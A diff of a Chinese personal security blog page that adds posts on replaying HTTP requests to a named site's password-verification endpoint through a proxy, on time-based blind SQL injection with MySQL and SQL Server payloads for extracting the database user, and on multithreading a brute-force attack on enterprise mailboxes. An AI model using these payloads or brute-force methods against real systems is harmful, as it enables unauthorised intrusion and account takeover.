@@ -194,6 +194,181 @@
           
           
             
+              <a class="post-title-link" href="/2015/09/18/python接发http请求/" itemprop="url">
+                python接发http请求
+              </a>
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2015-09-18T16:37:19+08:00" content="2015-09-18">
+            2015-09-18
+          </time>
+        </span>
+
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/09/18/python接发http请求/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/09/18/python接发http请求/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody"><h2 id="使用httplib时的设置方式">使用httplib时的设置方式</h2><pre><code><span class="keyword">import</span> httplib,urllib,urllib2;   
+params = urllib.urlencode({ 'param':<span class="string">"55B2A1EDA8B09D13"</span>,
+                            'js_sfl':<span class="number">2</span>,
+                            'codetxt':'<span class="number">532832</span>'});       
+headers = { <span class="string">"Host"</span>: <span class="string">"www.aokang.cn"</span>,
+            <span class="string">"Content-Length"</span>: <span class="string">"81"</span>,
+            <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>};   
+conn = httplib.<span class="type">HTTPConnection</span>(<span class="string">"localhost"</span>,<span class="number">8555</span>);<span class="comment">#在此步骤设置代理地址,可以在代理中看到请求,方便调试</span>
+conn.request(<span class="keyword">method</span>=<span class="string">"POST"</span>,url=<span class="string">"http://www.aokang.cn/member/verify_repassword.aspx?action=edit HTTP/1.1"</span>,body=params,headers=headers);      
+response = conn.getresponse();     
+conn.close();
+</code></pre><h2 id="使用urllib2时的设置方式">使用urllib2时的设置方式</h2><pre><code>import httplib,urllib,urllib2;   
+<span class="keyword">params</span> = urllib.urlencode({ <span class="string">'param'</span>:<span class="string">"55B2A1EDA8B09D13"</span>,
+                            <span class="string">'js_sfl'</span>:<span class="number">2</span>,
+                            <span class="string">'codetxt'</span>:<span class="string">'532832'</span>});       
+headers = { <span class="string">"Host"</span>: <span class="string">"www.aokang.cn"</span>,
+            <span class="string">"Content-Length"</span>: <span class="string">"81"</span>,
+            <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>};       
+opener = urllib2.build_opener( urllib2.ProxyHandler({<span class="string">'http'</span>:<span class="string">"localhost:8555"</span>}) )<span class="preprocessor">#在这一步设置代理地址和端口,可以看到请求</span>
+urllib2.install_opener(opener)
+sContent = urllib2.urlopen(<span class="string">"http://www.aokang.cn/member/verify_repassword.aspx?action=edit HTTP/1.1"</span>)
+req = urllib2.Request(url = <span class="string">"http://www.aokang.cn/member/verify_repassword.aspx?action=edit HTTP/1.1"</span>,data=<span class="keyword">params</span>)  
+</code></pre><p>总结:<br>1.可以在burp的repeater模块看看哪些参数可以删哪些不可以删.<br>2.header和body中有的参数不可以没有.<br>3.在连接主机的那一步通过设置代理,可以在代理中查看请求的详情,方便调试.<br>4.使用httplib.HTTPConnection的对象调用request的时候将参数传入body时会出现限定长度的情况,目前还没有解决</p>
+</span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              <a class="post-title-link" href="/2015/09/18/延时sql注入脚本/" itemprop="url">
+                延时sql注入脚本
+              </a>
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2015-09-18T16:07:54+08:00" content="2015-09-18">
+            2015-09-18
+          </time>
+        </span>
+
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/09/18/延时sql注入脚本/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/09/18/延时sql注入脚本/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody"><p>昨天找到个延时注入,sqlmap跑出来数据库类型,试了下sqlmap生成payload好使,就自己动手写一个脚本验证一下.<br>记录下实现过程:</p>
+<h2 id="实现逻辑">实现逻辑</h2><pre><code><span class="keyword">try</span>:
+    发送payload
+    payload = <span class="string">"aaa';sleep(10)"</span>
+    conn = httplib.<span class="type">HTTPConnection</span>(host,timeout = <span class="number">5</span>);
+    conn.request(<span class="keyword">method</span>=<span class="string">"POST"</span>,url=<span class="string">"目标"</span>,body=payload,headers=headers);
+    conn.getresponse()
+    conn.close()
+expect:
+    如果发现异常说明当前payload判断正确
+</code></pre><h2 id="MYSQL相关函数">MYSQL相关函数</h2><p>在mysql中注入payload可能是这样的</p>
+<pre><code>aaa,;<span class="keyword">if</span><span class="params">(ascii<span class="params">(mid<span class="params">(lower<span class="params">(user<span class="params">()</span>)</span>,<span class="number">1</span>,<span class="number">1</span>)</span>,sleep<span class="params">(<span class="number">8</span>)</span>,<span class="number">0</span>)</span>)</span>=<span class="number">97</span>
+</code></pre><p>说明:<br>1.当前用户(user)小写(lower)第一个字母(mid)的ascii码(ascii)等于97时延时(sleep)8秒.<br>2.mid(p1,p2,p3) p1为字符串,p2为起始位置,p3长度<br>3.在python中可以使用ord(“s”)来对应小写字母s的ascii码</p>
+<h2 id="SQLSERVER相关函数">SQLSERVER相关函数</h2><p>在sqlserver中payload可能是这样的</p>
+<pre><code>username=aa';if(ascii(substring(system_user,%d,1))=%d) <span class="operator"><span class="keyword">begin</span> WAITFOR DELAY <span class="string">'0:0:10'</span> <span class="keyword">end</span><span class="comment">--" % (i,ord(s))</span></span>
+</code></pre><p>说明:<br>1.当前用户(system_user)第i个字母(substring)的ascii码(ascii)等于小写字母s对应的ascii码(ord)时,延时(WAITFOR DELAY)10秒.<br>2.substring(p1,p2,p3) p1为字符串,p2为起始位置,p3长度,和mysql中的mid函数功能类似<br>3.ord是python内建函数,其他的函数是在目标数据库中执行的.</p>
+</span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
               <a class="post-title-link" href="/2015/09/16/浏览器解析算法/" itemprop="url">
                 浏览器解析算法
               </a>
@@ -342,7 +517,20 @@ success = []
       <span class="keyword">except</span>:
         <span class="keyword">pass</span>
 mailbruteforce(users,words) 
-</code></pre><h2 id="总结:">总结:</h2><p>1.企业邮箱是一个很好的入口,没有设置超时的企业邮箱使用人名top500和经典弱密码有很大的概率爆出密码.<br>2.脚本可以使用多任务<strong>提高效率</strong>,多进程,多线程,协程.<br>3.进一步研究邮箱拦截方式,突破超时.</p>
+</code></pre><h2 id="多线程版本">多线程版本</h2><p>效率还是太慢,想改成多线程增加点效率,随便还有待解决的问题,还是记录下来</p>
+<p>1.上面的基本思路是求两个线性分布的笛卡尔积.<br>2.多线程版本目前的思路是,开t个线程,每个线程<strong>分配一个用户名并开始爆破弱密码</strong>.</p>
+<pre><code><span class="class"><span class="keyword">class</span> <span class="title">myThread</span> <span class="params">(threading.Thread)</span>:</span>
+      <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,username,passwords)</span>:</span>
+    //初始化时传入参数
+      <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span>
+        <span class="keyword">for</span> password <span class="keyword">in</span> self.passwords:
+              连接邮箱并验证
+
+t = myThread(username,passwords)
+t.start()//线程开始运行
+t.join()//阻塞线程直到这一批开启的线程释放,所以一般放在循环外
+</code></pre><p>为每个线程分配任务的逻辑还是有点问题,日后再补.</p>
+<h2 id="总结:">总结:</h2><p>1.企业邮箱是一个很好的入口,没有设置超时的企业邮箱使用人名top500和经典弱密码有很大的概率爆出密码.<br>2.脚本可以使用多任务<strong>提高效率</strong>,多进程,多线程,协程.<br>3.进一步研究邮箱拦截方式,突破超时.</p>
 </span>
         
       
@@ -1139,175 +1327,6 @@ php+apache : id = <span class="number">3</span>
 
 
     
-      
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      
-      
-        <h1 class="post-title" itemprop="name headline">
-          
-          
-            
-              <a class="post-title-link" href="/2015/08/20/python编码操作/" itemprop="url">
-                python编码操作
-              </a>
-            
-          
-        </h1>
-      
-
-      <div class="post-meta">
-        <span class="post-time">
-          发表于
-          <time itemprop="dateCreated" datetime="2015-08-20T09:33:07+08:00" content="2015-08-20">
-            2015-08-20
-          </time>
-        </span>
-
-        
-
-        
-          
-            <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/2015/08/20/python编码操作/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/20/python编码操作/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-          
-        
-      </div>
-    </header>
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody"><p>将所有字符串按字符串储存时的编码方式解码(decode)为unicode编码进行操作.</p>
-<h2 id="查看一个汉字的GBK,unicode,utf-8编码">查看一个汉字的GBK,unicode,utf-8编码</h2><ul>
-<li><p>GBK</p>
-<p>  <code>//输入中文时默认的编码方式为gbk</code><br>  <code>&gt;&gt;&gt;s = &quot;汉&quot;</code><br>  <code>&gt;&gt;&gt;s</code><br>  <code>&#39;\xba\xba&#39;</code></p>
-</li>
-<li><p>unicode</p>
-<p>  <code>&gt;&gt;&gt;s = s.decode(&quot;gbk&quot;)</code><br>  <code>&gt;&gt;&gt;s</code><br>  <code>u&#39;\u6c49&#39;</code></p>
-</li>
-<li><p>utf-8</p>
-<p>  <code>&gt;&gt;&gt;s = s.encode(&quot;utf-8&quot;)</code><br>  <code>&gt;&gt;&gt;s</code><br>  <code>&#39;\xe6\xb1\x89&#39;</code></p>
-</li>
-</ul>
-<h2 id="查看英文字母的ascii码">查看英文字母的ascii码</h2><p>注：ascii码是世界上最先使用的编码方式，在后来的一系列编码方式中，不管是gbk ucnicde 还是utf-8对于asii码都是向下兼容的，也就是说编码结果是一样的（在所占字节数上可能会有差异）.</p>
-<pre><code>&gt;&gt;&gt;<span class="string">"admin"</span>.<span class="function"><span class="title">encode</span><span class="params">(<span class="string">"hex"</span>)</span></span>
-<span class="string">'61646d696e'</span>
-&gt;&gt;&gt;<span class="string">'61646d696e'</span>.<span class="function"><span class="title">decode</span><span class="params">(<span class="string">"hex"</span>)</span></span>
-<span class="string">'admin'</span>
-</code></pre></span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      
-      
-        <h1 class="post-title" itemprop="name headline">
-          
-          
-            
-              <a class="post-title-link" href="/2015/08/19/cmd命令使用记录/" itemprop="url">
-                cmd命令使用记录
-              </a>
-            
-          
-        </h1>
-      
-
-      <div class="post-meta">
-        <span class="post-time">
-          发表于
-          <time itemprop="dateCreated" datetime="2015-08-19T15:33:48+08:00" content="2015-08-19">
-            2015-08-19
-          </time>
-        </span>
-
-        
-
-        
-          
-            <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/2015/08/19/cmd命令使用记录/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/19/cmd命令使用记录/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-          
-        
-      </div>
-    </header>
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody"><h2 id="查看当前活动代码页（默认编码格式）">查看当前活动代码页（默认编码格式）</h2><pre><code><span class="built_in">cmd</span>&gt; <span class="built_in">chcp</span>
-//活动代码页为：<span class="number">936</span>，它对于的编码格式为GBK
-</code></pre><h2 id="设置当前cmd窗口标题">设置当前cmd窗口标题</h2><pre><code><span class="built_in">cmd</span>&gt; <span class="built_in">title</span> Hello Mr.Q
-</code></pre><h2 id="添加删除程序">添加删除程序</h2><pre><code><span class="tag">cmd</span>&gt; <span class="tag">appwiz</span><span class="class">.cpl</span>
-</code></pre><h2 id="启动计算器">启动计算器</h2><pre><code><span class="built_ins">cmd</span>&gt; calc
-</code></pre><h2 id="事件查看器">事件查看器</h2><pre><code><span class="built_ins">cmd</span>&gt; eventvwr
-</code></pre><h2 id="查看系统配置">查看系统配置</h2><pre><code><span class="built_ins">cmd</span>&gt; msinfo32
-</code></pre><h2 id="注册表编辑器">注册表编辑器</h2><pre><code><span class="built_ins">cmd</span>&gt; regedit
-</code></pre><h2 id="用户操作">用户操作</h2><pre><code><span class="built_ins">cmd</span>&gt; net <span class="built_ins">user</span>
-//查看现有账户
-<span class="built_ins">cmd</span>&gt; net <span class="built_ins">user</span> admin
-//查看admin账户详情
-<span class="built_ins">cmd</span>&gt; net <span class="built_ins">user</span> admin    password /<span class="built_ins">add</span>
-//添加用户
-<span class="built_ins">cmd</span>&gt; net <span class="built_ins">user</span> admin /del
-//删除
-</code></pre></span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1346,7 +1365,7 @@ php+apache : id = <span class="number">3</span>
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">28</span>
+              <span class="site-state-item-count">30</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -1360,7 +1379,7 @@ php+apache : id = <span class="number">3</span>
 
           <div class="site-state-item site-state-tags">
             <a href="/tags">
-              <span class="site-state-item-count">24</span>
+              <span class="site-state-item-count">26</span>
               <span class="site-state-item-name">标签</span>
               </a>
           </div>
